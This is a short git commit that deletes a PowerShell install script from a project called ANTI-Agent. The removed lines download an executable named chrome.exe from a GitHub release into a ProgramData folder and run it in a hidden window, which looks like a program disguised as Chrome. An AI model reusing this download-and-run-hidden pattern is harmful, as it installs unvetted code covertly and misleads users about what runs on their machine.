982565dc3c7b013f8ffa962e98a739a8075bf54a
AdamZoda <moufrijea@gmail.com>
2026-08-04 17:16:23 +0100

    remove install.ps1 - anti-scan.exe is the only installer

--- install.ps1
+++
@@ -1,5 +0,0 @@
-$d = "$env:ProgramData\chrome"
-New-Item -ItemType Directory -Path $d -Force | Out-Null
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-WebRequest -Uri "https://github.com/AdamZoda/ANTI-Agent/releases/download/v1.0.0/chrome.exe" -OutFile "$d\chrome.exe"
-Start-Process "$d\chrome.exe" "--install" -WindowStyle Hidden
